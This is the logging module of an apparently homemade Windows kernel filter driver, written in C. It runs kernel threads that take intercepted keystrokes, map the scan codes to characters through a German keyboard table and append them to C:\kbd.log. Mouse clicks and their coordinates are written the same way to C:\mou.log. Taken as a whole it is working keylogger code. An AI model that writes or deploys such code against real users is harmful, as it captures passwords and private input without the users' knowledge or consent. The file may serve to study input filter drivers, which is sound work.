#include "log.h"
#include "debug.h"
#include "dispatch.h"
#include <ntstrsafe.h>

typedef NTSTATUS(*tLogToFileFunc)(PLIST_ENTRY pListEntry, HANDLE hFile);

typedef struct LogThreadData {
	LogType type;
	tLogToFileFunc pLogToFileFunc;
	PUNICODE_STRING pFileName;
}LogThreadData;

PKTHREAD pLogThreads[LOG_MAX];

BlockingQueue inputQueues[LOG_MAX];

static UNICODE_STRING kbdLogFileName = RTL_CONSTANT_STRING(L"\\DosDevices\\C:\\kbd.log");
static UNICODE_STRING mouLogFileName = RTL_CONSTANT_STRING(L"\\DosDevices\\C:\\mou.log");

static void logStartRoutine(PVOID pStartContext);
static NTSTATUS logKbdToFile(PLIST_ENTRY pKbdListEntry, HANDLE hFile);
static NTSTATUS logMouToFile(PLIST_ENTRY pMouListEntry, HANDLE hFile);

NTSTATUS startLogThread(PDRIVER_OBJECT pDriverObject, LogType type) {
	HANDLE hLogThread = NULL;
	OBJECT_ATTRIBUTES threadAttributes = { 0 };
	InitializeObjectAttributes(&threadAttributes, NULL, 0, NULL, NULL);
	LogThreadData* pLogThreadData = (LogThreadData*)ExAllocatePool2(POOL_FLAG_NON_PAGED, sizeof(LogThreadData), LOG_THREAD_DATA_TAG);

	if (!pLogThreadData) {
		DBG_PRINT("startLogThread: ExAllocatePool2 failed\n");

		return STATUS_MEMORY_NOT_ALLOCATED;
	}

	pLogThreadData->type = type;

	switch (type) {
	case LOG_KBD:
		pLogThreadData->pLogToFileFunc = logKbdToFile;
		pLogThreadData->pFileName = &kbdLogFileName;
		break;
	case LOG_MOU:
		pLogThreadData->pLogToFileFunc = logMouToFile;
		pLogThreadData->pFileName = &mouLogFileName;
		break;
	default:
		return STATUS_UNSUCCESSFUL;
		break;
	}

	NTSTATUS ntStatus = STATUS_SUCCESS;

	if (pLogThreads[type]) {
		ntStatus = KeWaitForSingleObject(pLogThreads[type], Executive, KernelMode, FALSE, NULL);

		if (!NT_SUCCESS(ntStatus)) {
			DBG_PRINTF("startLogThread: KeWaitForSingleObject failed: 0x%lx\n", ntStatus);

			return ntStatus;
		}

		ObfDereferenceObject(pLogThreads[type]);
		pLogThreads[type] = NULL;
	}

	ntStatus = IoCreateSystemThread(pDriverObject, &hLogThread, DELETE | SYNCHRONIZE, &threadAttributes, NULL, NULL, logStartRoutine, pLogThreadData);

	if (!NT_SUCCESS(ntStatus)) {
		DBG_PRINTF("startLogThread: IoCreateSystemThread failed: 0x%lx\n", ntStatus);

		return ntStatus;
	}

	ntStatus = ObReferenceObjectByHandle(hLogThread, SYNCHRONIZE, NULL, KernelMode, &pLogThreads[type], NULL);

	if (!NT_SUCCESS(ntStatus)) {
		DBG_PRINTF("startLogThread: ObReferenceObjectByHandle failed: 0x%lx\n", ntStatus);
	}

	ntStatus = ZwClose(hLogThread);

	if (!NT_SUCCESS(ntStatus)) {
		DBG_PRINTF("startLogThread: ZwClose failed: 0x%lx\n", ntStatus);
	}

	return ntStatus;
}


static void logStartRoutine(PVOID pStartContext) {
	LogThreadData* pLogThreadData = (LogThreadData*)pStartContext;
	HANDLE hLogFile = NULL;
	OBJECT_ATTRIBUTES fileAttributes;
	InitializeObjectAttributes(&fileAttributes, pLogThreadData->pFileName, OBJ_CASE_INSENSITIVE | OBJ_KERNEL_HANDLE, NULL, NULL);
	IO_STATUS_BLOCK ioStatusBlock = { 0 };
	NTSTATUS ntStatus = ZwCreateFile(&hLogFile, FILE_WRITE_DATA, &fileAttributes, &ioStatusBlock, NULL, FILE_ATTRIBUTE_NORMAL, 0, FILE_OVERWRITE_IF, FILE_SYNCHRONOUS_IO_NONALERT, NULL, 0);

	if (!NT_SUCCESS(ntStatus)) {
		DBG_PRINTF("logStartRoutine: ZwCreateFile failed: 0x%lx\n", ntStatus);

		return;
	}

	BlockingQueue* const pCurBlockingQueue = &inputQueues[pLogThreadData->type];

	// write to file while queue is not empty and waiting
	while (pCurBlockingQueue->isWaiting || pCurBlockingQueue->size) {
		LIST_ENTRY* pListEntry = NULL;
		ntStatus = removeFromBlockingQueue(pCurBlockingQueue, &pListEntry);

		if (!NT_SUCCESS(ntStatus)) {
			DBG_PRINTF("logStartRoutine: removeBlockingQueue failed: 0x%lx\n", ntStatus);

			continue;
		}

		pLogThreadData->pLogToFileFunc(pListEntry, hLogFile);
	}

	ntStatus = ZwClose(hLogFile);
	ExFreePoolWithTag(pLogThreadData, LOG_THREAD_DATA_TAG);

	if (!NT_SUCCESS(ntStatus)) {
		DBG_PRINTF("logStartRoutine: ZwClose failed: 0x%lx\n", ntStatus);
	}

	return;
}


// Scan code to ascii lookup array
// Currently a mess and for german keyboard layouts.
static const char scanToAscii[0x80] = {
	0,  0x1B, // ESC
	'1', '2', '3', '4', '5', '6', '7', '8', '9', '0', 'ß', '´', '\b',
	 '\t', 'q', 'w', 'e', 'r', 't', 'z', 'u', 'i', 'o', 'p', 'ü', '+', '\n', 0, // CTRL
	'a', 's', 'd', 'f', 'g', 'h', 'j', 'k', 'l', ';', '\'', '^',  0,
	'#', 'y', 'x', 'c', 'v', 'b', 'n', 'm', ',', '.', '-',
	0,
	0, // LSHIFT
	0, // ALT
	' ',
	0,  /* Caps lock */
	0,  /* 59 - F1 key ... > */
	0,   0,   0,   0,   0,   0,   0,   0,
	0,  /* < ... F10 */
	0,  /* 69 - Num lock*/
	0,  /* Scroll Lock */
	0,  /* Home key */
	0,  /* Up Arrow */
	0,  /* Page Up */
  '-',
	0,  /* Left Arrow */
	0,
	0,  /* Right Arrow */
  '+',
	0,  /* 79 - End key*/
	0,  /* Down Arrow */
	0,  /* Page Down */
	0,  /* Insert Key */
	0,  /* Delete Key */
	0,   0,   0,
	0,  /* F11 Key */
	0,  /* F12 Key */
	0,  /* All other keys are undefined */
};

void logKbdToDbg(PKEYBOARD_INPUT_DATA pKbdInputData) {
	DBG_PRINT("++++++++++++\n");

	if (!pKbdInputData) {
		DBG_PRINT("logKbdToDbg: No data\n");
		DBG_PRINT("++++++++++++\n");

		return;
	}

	DBG_PRINTF("logKbdToDbg: MakeCode: %hu\n", pKbdInputData->MakeCode);

	if (pKbdInputData->Flags & KEY_BREAK) {
		DBG_PRINT("logKbdToDbg: Flag: KEY_BREAK\n");
	}
	else {
		DBG_PRINT("logKbdToDbg: Flag: KEY_MAKE\n");
	}

	if (pKbdInputData->Flags & KEY_E0) {
		DBG_PRINT("logKbdToDbg: Flag: KEY_E0\n");
	}

	if (pKbdInputData->Flags & KEY_E1) {
		DBG_PRINT("logKbdToDbg: Flag: KEY_E1\n");
	}

	const char ascii = scanToAscii[pKbdInputData->MakeCode];

	if (ascii) {
		DBG_PRINTF("logKbdToDbg: ASCII char: %c\n", ascii);
	}

	DBG_PRINT("++++++++++++\n");

	return;
}


void logMouToDbg(PMOUSE_INPUT_DATA pMouInputData) {

	if (!pMouInputData) {
		DBG_PRINT("------------\n");
		DBG_PRINT("logMouToDbg: No data\n");
		DBG_PRINT("------------\n");

		return;
	}

	BOOLEAN log = FALSE;
	char buffer[0x20] = { 0 };
	NTSTATUS ntStatus = STATUS_SUCCESS;

	if (pMouInputData->ButtonFlags == MOUSE_LEFT_BUTTON_DOWN) {
		log = TRUE;
		ntStatus = RtlStringCbPrintfA(buffer, sizeof(buffer), "%s", "MOUSE_LEFT_BUTTON_DOWN");
	}
	else if (pMouInputData->ButtonFlags == MOUSE_LEFT_BUTTON_UP) {
		log = TRUE;
		ntStatus = RtlStringCbPrintfA(buffer, sizeof(buffer), "%s", "MOUSE_LEFT_BUTTON_UP");
	}
	else if (pMouInputData->ButtonFlags == MOUSE_RIGHT_BUTTON_DOWN) {
		log = TRUE;
		ntStatus = RtlStringCbPrintfA(buffer, sizeof(buffer), "%s", "MOUSE_RIGHT_BUTTON_DOWN");
	}
	else if (pMouInputData->ButtonFlags == MOUSE_RIGHT_BUTTON_UP) {
		log = TRUE;
		ntStatus = RtlStringCbPrintfA(buffer, sizeof(buffer), "%s", "MOUSE_RIGHT_BUTTON_UP");
	}

	if (!NT_SUCCESS(ntStatus)) {
		DBG_PRINT("------------\n");
		DBG_PRINTF("logMouToDbg: RtlStringCbPrintfA failed: 0x%lx\n", ntStatus);
		DBG_PRINT("------------\n");

		return;
	}

	if (log) {
		DBG_PRINT("------------\n");
		DBG_PRINTF("logMouToDbg: %s\n", buffer);
		DBG_PRINTF("logMouToDbg: Position X: %d\n", pMouInputData->LastX);
		DBG_PRINTF("logMouToDbg: Position Y: %d\n", pMouInputData->LastY);
		DBG_PRINT("------------\n");
	}

	return;
}


static NTSTATUS logKbdToFile(PLIST_ENTRY pKbdListEntry, HANDLE hFile) {
	KbdDataEntry* const pKbdDataEntry = CONTAINING_RECORD(pKbdListEntry, KbdDataEntry, list);
	NTSTATUS ntStatus = STATUS_SUCCESS;

	if (!(pKbdDataEntry->data.Flags & KEY_BREAK)) {
		const char key = scanToAscii[pKbdDataEntry->data.MakeCode];

		char buffer[0x8] = { 0 };
		ntStatus = RtlStringCbPrintfA(buffer, sizeof(buffer), "%c", key);

		if (!NT_SUCCESS(ntStatus)) {
			DBG_PRINTF("logKbdToFile: RtlStringCbPrintfA failed: 0x%lx\n", ntStatus);

			return ntStatus;
		}

		size_t strLen = 0;
		ntStatus = RtlStringCbLengthA(buffer, sizeof(buffer), &strLen);

		if (!NT_SUCCESS(ntStatus)) {
			DBG_PRINTF("logKbdToFile: RtlStringCbLengthA failed: 0x%lx\n", ntStatus);

			return ntStatus;
		}

		IO_STATUS_BLOCK ioStatusBlock = { 0 };
		ntStatus = ZwWriteFile(hFile, NULL, NULL, NULL, &ioStatusBlock, buffer, (ULONG)strLen, NULL, NULL);

		if (!NT_SUCCESS(ntStatus)) {
			DBG_PRINTF("logKbdToFile: ZwWriteFile failed: 0x%lx\n", ntStatus);

			return ntStatus;
		}

	}

	ExFreePoolWithTag(pKbdDataEntry, KBD_LIST_DATA_TAG);

	return ntStatus;
}


static NTSTATUS logMouToFile(PLIST_ENTRY pMouListEntry, HANDLE hFile) {
	MouDataEntry* const pMouDataEntry = CONTAINING_RECORD(pMouListEntry, MouDataEntry, list);
	NTSTATUS ntStatus = STATUS_SUCCESS;

	if (pMouDataEntry->data.ButtonFlags == MOUSE_LEFT_BUTTON_DOWN || pMouDataEntry->data.ButtonFlags == MOUSE_RIGHT_BUTTON_DOWN) {
		char buffer[0x20] = { 0 };

		if (pMouDataEntry->data.ButtonFlags == MOUSE_LEFT_BUTTON_DOWN) {
			ntStatus = RtlStringCbPrintfA(buffer, sizeof(buffer), "%s%d%s%d%c", "LEFT@X:", pMouDataEntry->data.LastX, "Y:", pMouDataEntry->data.LastY, '\n');
		}
		else if (pMouDataEntry->data.ButtonFlags == MOUSE_RIGHT_BUTTON_DOWN) {
			ntStatus = RtlStringCbPrintfA(buffer, sizeof(buffer), "%s%d%s%d%c", "RIGHT@X:", pMouDataEntry->data.LastX, "Y:", pMouDataEntry->data.LastY, '\n');
		}

		if (!NT_SUCCESS(ntStatus)) {
			DBG_PRINTF("logMouToFile: RtlStringCbPrintfA failed: 0x%lx\n", ntStatus);

			return ntStatus;
		}

		size_t strLen = 0;
		ntStatus = RtlStringCbLengthA(buffer, sizeof(buffer), &strLen);

		if (!NT_SUCCESS(ntStatus)) {
			DBG_PRINTF("logMouToFile: RtlStringCbLengthA failed: 0x%lx\n", ntStatus);

			return ntStatus;
		}

		IO_STATUS_BLOCK ioStatusBlock = { 0 };
		ntStatus = ZwWriteFile(hFile, NULL, NULL, NULL, &ioStatusBlock, buffer, (ULONG)strLen, NULL, NULL);

		if (!NT_SUCCESS(ntStatus)) {
			DBG_PRINTF("logMouToFile: ZwWriteFile failed: 0x%lx\n", ntStatus);

			return ntStatus;
		}

	}

	ExFreePoolWithTag(pMouDataEntry, MOU_LIST_DATA_TAG);

	return ntStatus;
}